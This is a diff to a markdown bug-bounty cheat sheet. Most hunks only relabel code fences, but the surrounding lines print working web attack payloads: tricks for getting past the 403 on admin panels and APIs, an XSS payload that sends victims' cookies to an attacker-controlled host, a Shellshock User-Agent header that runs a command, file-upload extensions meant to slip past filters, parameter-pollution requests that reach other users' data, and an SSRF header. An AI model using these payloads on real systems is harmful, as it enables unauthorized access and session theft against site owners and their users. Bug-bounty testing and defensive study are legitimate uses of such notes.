@@ -1,48 +1,48 @@
 # Bug Bounty Tips File -1 
 ### Admin Panel Bypass tricks and techniques.
 #### Example
-```js
+```http
 GET /admin HTTP/1.1
 Host: web.com  ====> 403 Forbidden
 ```
 #### Bypass
-```js
+```http
 GET /anything HTTP/1.1
 Host: web.com
 X-Original-URL: /admin  ====> 200 ok
 ```
 #### Example
-```js
+```http
 /admin/panel  ====> 403 Forbidden
 ```
 #### Bypass
-```js
+```http
 /admin/monitor  ====> 200 ok
 /admin/monitor/;panel  ====> 302 Found
 ```
 #### Example
-```js
+```http
 abc.com/admin  ====> 403 Forbidden
 ```
 #### Bypass
-```js
+```http
 abc.com/admin/.  ====> 200 ok
 abc.com//admin//  =====> 200 ok
 abc.com/./admin/./ ====> 200 ok
 abc.com/secret.txt/  ====> 403
 abc.com/%2f/secret.txt/  ====> 200 ok
 ```
-```js
+```http
 https://abc.com/admin ===> 302
 https://abc.com/admin..;/  ===> 200 ok
 ```
-```js
+```http
 sub.abc.com/web/admin/  ====> 302
 sub.abc.com/web/aDmiN/  ====> 200 ok
 sub.abc.com/web/aDmiN/FUZZ  ====> Sensitie Files
 ```
 ### Path Traversal
-```js
+```http
 https://abc.com/path ===> 403
 https://abc.com%2e/path ===> 200 ok
 ```
@@ -51,7 +51,7 @@ https://abc.com%2e/path ===> 200 ok
 ```js
 ">svg onx=() onload=(location.href='<BIN>/?mycookies='+document['cookie'])()>
 ```
-##### EX
+##### Example
 ```js
 "javascript:" xss blocked
 ```
@@ -175,10 +175,10 @@ println "out>$sout err> $serr"
 4. Read credentials in clear Text. 
 
 ### Extension list for File Upload Bugs
-```js
+```text
 ASP ==> .aspx,.config,.ashx,.asmx,.aspq,.axd,.cshtm,.cshtml,.rem,.soap,.vbhtm,.vbhtml,.asa,.asp,.cer,.shtml
 ```
-```js
+```text
 PHP ==> .php,.php5,php3,.php2,.shtml,.html,.php.png(double extension attack)
 ```
 #### Common Secret file paths
@@ -219,11 +219,11 @@ Send the following query to list the whole schema of the endpoint. it will list 
 - [Projectdiscovery-tools](https://github.com/projectdiscovery)
 - [gau-tools](https://github.com/lc/gau)
 ##### Run this
-```bash
+```sh
 echo abc.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
 ```
 #### Burpsuite Search Keywords
-```
+```text
 uri=,url=,key=,.json,oauth,redirect=,api,dashboard,config,=http,&api,@(for user based URL for SSRF)
 ```
 ### Common Tips and Tricks
@@ -235,7 +235,7 @@ chaos -d abc.com -bbq -filter-wildcard -http-url | xargs =l@-P5 sh -c 'gospider 
 **Auth-Bypass**
 ![Auth-bypass](img/auth_bypass.png)
 **Bash-Injection**
-```js
+```http
 User-Agent:() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;
 Pragme: no-cache
 ```
@@ -350,17 +350,17 @@ total 12
 **Tip 2**
 ![ACTR](img/acto.png)
 ### API Bypass Tips
-```js
+```http
 {"id":111}  ====> 401 unauthorized
 {"id":{"id":1111}}  ====> 200 ok
 ```
 ---
-```js
+```http
 POST /api/get_profile
 Content-Type: application/json {"user_id":<attacker_id>,"user_id":<victim_id>}
 ```
 ---
-```js
+```http
 GET /api_v1/messages?User_id=victim_id  ====> 401 
 GET /api_vi/messages?user_id=attacker&user_id=victim  ====> 200
 ```
@@ -378,7 +378,7 @@ GET /api_vi/messages?user_id=attacker&user_id=victim  ====> 200
 
 ### SSRF
 ---
-```js
+```http
 POST /something HTTP/1.0
 HOST: abc.com
 X-Forwarded-For: <burp-collab.net>
@@ -412,7 +412,7 @@ wfuzz -hc 403 -c -w enormousdns.txt -H "HOST:FUZZ.abc.com" abc.com
 ```
 ---
 ***Get source code***
-```js
+```http
 site.com/file.php  ====> 403
 site.com/file.php~  ====> 200 ok <you will get source_code>
 ```
